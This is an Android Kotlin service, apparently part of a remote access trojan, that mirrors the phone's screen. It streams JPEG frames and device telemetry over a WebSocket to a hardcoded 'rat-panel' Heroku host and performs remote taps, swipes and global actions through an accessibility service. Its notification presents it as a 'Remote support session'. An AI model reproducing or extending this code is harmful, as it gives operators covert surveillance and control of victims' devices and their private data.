package com.screenlink.remote

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.util.Base64
import android.util.DisplayMetrics
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.math.max
import kotlin.math.min

class ScreenLinkService : Service() {

    companion object {
        const val ACTION_START = "com.screenlink.remote.START"
        const val ACTION_STOP = "com.screenlink.remote.STOP"
        const val EXTRA_RESULT_CODE = "result_code"
        const val EXTRA_RESULT_DATA = "result_data"

        const val API_BASE_URL = "https://rat-panel-b91839a4be83.herokuapp.com"

        private const val CHANNEL_ID = "screenlink_session"
        private const val NOTIFICATION_ID = 4102

        private const val MAX_DIMENSION = 720
        private const val JPEG_QUALITY = 55
        private const val TARGET_FPS = 10
        private const val TELEMETRY_INTERVAL = 30_000L

        @Volatile
        var isRunning = false
            private set
    }

    private val backgroundThread = HandlerThread("screenlink-capture").apply { start() }
    private val backgroundHandler = Handler(backgroundThread.looper)
    private val encoder = Executors.newSingleThreadExecutor()
    private val encoding = AtomicBoolean(false)

    private val client = OkHttpClient.Builder()
        .pingInterval(20, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    private var webSocket: WebSocket? = null
    private var reconnectAttempts = 0
    private var shuttingDown = false

    private var projection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null

    private var screenWidth = 0
    private var screenHeight = 0
    private var captureWidth = 0
    private var captureHeight = 0

    @Volatile private var streaming = false
    @Volatile private var lastFrameAt = 0L
    @Volatile private var lastTelemetryAt = 0L

    private val projectionCallback = object : MediaProjection.Callback() {
        override fun onStop() {
            releaseDisplay()
        }
    }

    private val displayListener = object : DisplayManager.DisplayListener {
        override fun onDisplayAdded(displayId: Int) {}
        override fun onDisplayRemoved(displayId: Int) {}
        override fun onDisplayChanged(displayId: Int) {
            backgroundHandler.post { recreateDisplayIfNeeded() }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        isRunning = true
        val dm = getSystemService(Context.DISPLAY_SERVICE) as DisplayManager
        dm.registerDisplayListener(displayListener, backgroundHandler)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_STOP -> {
                shutdown()
                return START_NOT_STICKY
            }
            else -> {
                startForegroundSafely()

                val resultCode = intent?.getIntExtra(EXTRA_RESULT_CODE, 0) ?: 0
                @Suppress("DEPRECATION")
                val resultData = intent?.getParcelableExtra<Intent>(EXTRA_RESULT_DATA)

                if (projection == null && resultData != null) {
                    startProjection(resultCode, resultData)
                }
                connectSocket()
            }
        }
        return START_STICKY
    }

    override fun onDestroy() {
        isRunning = false
        shutdown()
        super.onDestroy()
    }

    // ------------------------------------------------------------- foreground

    private fun startForegroundSafely() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val manager = getSystemService(NotificationManager::class.java)
            if (manager.getNotificationChannel(CHANNEL_ID) == null) {
                manager.createNotificationChannel(
                    NotificationChannel(
                        CHANNEL_ID,
                        getString(R.string.notification_channel),
                        NotificationManager.IMPORTANCE_LOW
                    )
                )
            }
        }

        val openApp = PendingIntent.getActivity(
            this,
            0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(getString(R.string.notification_title))
            .setContentText("Remote support session active")
            .setSmallIcon(android.R.drawable.ic_menu_view)
            .setOngoing(true)
            .setContentIntent(openApp)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    // -------------------------------------------------------------- projection

    private fun startProjection(resultCode: Int, data: Intent) {
        val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val mediaProjection = try {
            mpm.getMediaProjection(resultCode, data)
        } catch (_: Exception) {
            null
        } ?: return

        projection = mediaProjection
        mediaProjection.registerCallback(projectionCallback, backgroundHandler)
        createVirtualDisplay()
    }

    private fun screenMetrics(): DisplayMetrics {
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        (getSystemService(Context.WINDOW_SERVICE) as WindowManager)
            .defaultDisplay.getRealMetrics(metrics)
        return metrics
    }

    private fun createVirtualDisplay() {
        val active = projection ?: return
        val metrics = screenMetrics()

        screenWidth = metrics.widthPixels
        screenHeight = metrics.heightPixels

        val scale = min(1f, MAX_DIMENSION.toFloat() / max(screenWidth, screenHeight).toFloat())
        captureWidth = (screenWidth * scale).toInt().coerceAtLeast(2)
        captureHeight = (screenHeight * scale).toInt().coerceAtLeast(2)

        imageReader?.setOnImageAvailableListener(null, null)
        imageReader?.close()
        virtualDisplay?.release()

        val reader = ImageReader.newInstance(
            screenWidth, screenHeight, PixelFormat.RGBA_8888, 2
        )
        reader.setOnImageAvailableListener({ onImageAvailable() }, backgroundHandler)
        imageReader = reader

        virtualDisplay = active.createVirtualDisplay(
            "ScreenLinkCapture",
            screenWidth,
            screenHeight,
            metrics.densityDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            reader.surface,
            null,
            backgroundHandler
        )
    }

    private fun recreateDisplayIfNeeded() {
        val metrics = screenMetrics()
        if (metrics.widthPixels != screenWidth || metrics.heightPixels != screenHeight) {
            createVirtualDisplay()
        }
    }

    private fun releaseDisplay() {
        imageReader?.setOnImageAvailableListener(null, null)
        imageReader?.close()
        imageReader = null
        virtualDisplay?.release()
        virtualDisplay = null
        projection?.unregisterCallback(projectionCallback)
        projection = null
    }

    // ------------------------------------------------------------- capture

    private fun onImageAvailable() {
        val reader = imageReader ?: return
        val image = reader.acquireLatestImage() ?: return

        if (!streaming) {
            image.close()
            return
        }

        val now = System.currentTimeMillis()
        if (now - lastFrameAt < 1000L / TARGET_FPS) {
            image.close()
            return
        }

        if (!encoding.compareAndSet(false, true)) {
            image.close()
            return
        }

        lastFrameAt = now

        encoder.execute {
            try {
                val bitmap = imageToBitmap(image)
                image.close()

                val scaled = if (bitmap.width == captureWidth && bitmap.height == captureHeight) {
                    bitmap
                } else {
                    Bitmap.createScaledBitmap(bitmap, captureWidth, captureHeight, true)
                }

                val output = ByteArrayOutputStream()
                scaled.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, output)
                val encoded = Base64.encodeToString(output.toByteArray(), Base64.NO_WRAP)

                if (scaled !== bitmap) scaled.recycle()
                bitmap.recycle()

                val payload = JSONObject().apply {
                    put("type", "frame")
                    put("w", captureWidth)
                    put("h", captureHeight)
                    put("ts", System.currentTimeMillis())
                    put("data", encoded)
                }
                webSocket?.send(payload.toString())
            } catch (_: Exception) {
                // frame drop acceptable
            } finally {
                encoding.set(false)
            }
        }
    }

    private fun imageToBitmap(image: Image): Bitmap {
        val plane = image.planes[0]
        val buffer = plane.buffer
        val pixelStride = plane.pixelStride
        val rowStride = plane.rowStride
        val rowPadding = rowStride - pixelStride * image.width

        val padded = Bitmap.createBitmap(
            image.width + rowPadding / pixelStride,
            image.height,
            Bitmap.Config.ARGB_8888
        )
        padded.copyPixelsFromBuffer(buffer)

        return if (rowPadding == 0) {
            padded
        } else {
            val cropped = Bitmap.createBitmap(padded, 0, 0, image.width, image.height)
            padded.recycle()
            cropped
        }
    }

    // -------------------------------------------------------------- socket

    private fun socketUrl(): String {
        val base = API_BASE_URL.replace("https://", "wss://").replace("http://", "ws://")
        return "$base/ws/device/$registrationId()"
    }

    private fun registrationId(): String =
        getSharedPreferences(DeviceTelemetry.PREFS, Context.MODE_PRIVATE)
            .getString("registration_id", "") ?: ""

    private fun connectSocket() {
        if (shuttingDown) return
        if (webSocket != null) return

        val request = Request.Builder().url(socketUrl()).build()

        webSocket = client.newWebSocket(request, object : WebSocketListener() {

            override fun onOpen(socket: WebSocket, response: Response) {
                reconnectAttempts = 0
                sendTelemetry(force = true)
            }

            override fun onMessage(socket: WebSocket, text: String) {
                handleServerMessage(text)
            }

            override fun onFailure(socket: WebSocket, t: Throwable, response: Response?) {
                webSocket = null
                scheduleReconnect()
            }

            override fun onClosed(socket: WebSocket, code: Int, reason: String) {
                webSocket = null
                scheduleReconnect()
            }
        })
    }

    private fun scheduleReconnect() {
        if (shuttingDown) return
        reconnectAttempts = (reconnectAttempts + 1).coerceAtMost(6)
        val delay = (1000L * (1 shl (reconnectAttempts - 1))).coerceAtMost(20_000L)
        backgroundHandler.postDelayed({ connectSocket() }, delay)
    }

    private fun handleServerMessage(text: String) {
        val message = try { JSONObject(text) } catch (_: Exception) { return }

        when (message.optString("type")) {
            "stream_start" -> {
                streaming = true
                if (projection == null) {
                    // projection band ho gaya tha — activity se dobara maangna padega
                }
            }
            "stream_stop" -> streaming = false
            "control" -> handleControl(message)
        }
    }

    private fun handleControl(message: JSONObject) {
        val service = ControlAccessibilityService.instance ?: return
        if (screenWidth <= 0 || screenHeight <= 0) return

        fun px(x: Double) = (x * screenWidth).toFloat()
        fun py(y: Double) = (y * screenHeight).toFloat()

        when (message.optString("action")) {
            "tap" -> service.tap(px(message.optDouble("x")), py(message.optDouble("y")))

            "long_press" -> service.longPress(
                px(message.optDouble("x")),
                py(message.optDouble("y")),
                message.optLong("duration", 700L)
            )

            "swipe" -> service.swipe(
                px(message.optDouble("x1")),
                py(message.optDouble("y1")),
                px(message.optDouble("x2")),
                py(message.optDouble("y2")),
                message.optLong("duration", 250L)
            )

            "global" -> service.global(message.optString("name"))
        }
    }

    private fun sendTelemetry(force: Boolean = false) {
        val now = System.currentTimeMillis()
        if (!force && now - lastTelemetryAt < TELEMETRY_INTERVAL) return
        lastTelemetryAt = now

        encoder.execute {
            val payload = JSONObject().apply {
                put("type", "telemetry")
                put("data", DeviceTelemetry.build(this@ScreenLinkService))
            }
            webSocket?.send(payload.toString())
        }
    }

    // ------------------------------------------------------------- shutdown

    private fun shutdown() {
        shuttingDown = true
        streaming = false

        webSocket?.close(1000, "service stopping")
        webSocket = null

        releaseDisplay()

        runCatching { stopForeground(true) }
    }
}